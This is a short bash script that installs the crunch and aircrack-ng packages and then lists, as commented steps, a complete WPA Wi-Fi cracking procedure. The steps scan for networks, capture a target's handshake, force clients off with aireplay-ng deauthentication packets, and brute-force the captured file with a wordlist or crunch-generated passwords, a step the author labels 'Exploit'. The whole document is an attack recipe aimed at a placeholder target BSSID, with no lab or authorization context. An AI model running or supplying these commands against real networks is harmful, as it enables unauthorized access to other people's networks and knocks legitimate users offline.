#!/usr/bin/env bash
sudo apt install crunch --yes
sudo apt install aircrack-ng --yes


#TODO
#iwconfig 															| To show the network adapter name
#sudo airodump-ng {{NETWORK ADAPTER NAME}} 														| To scann the wireless networks available
#																| ** Save the BSSID of the target network
#sudo airodump-ng --bssid {{TARGET BSSID}} --channel {{TARGET NETWORK CHANNEL}} --write wpa-crack {{NETWORK ADAPTER NAME}}	| To make the handsahke **Leave it until the font color turns red
#sudo aireplay-ng --deauth 20 -a {{TARGET BSSID}} {{NETWORK ADAPTER NAME}}							| TO send the handshake 
#sudo vim wordlist.txt 														| To create the Key words list
#sudo aircrack-ng -w wordlist.txt wpa-crack-01.cap
#sudo crunch 8 8 | aircrack-ng -w - -b {{TARGET BSSID}} wpa-crack-01.cap							| Exploit
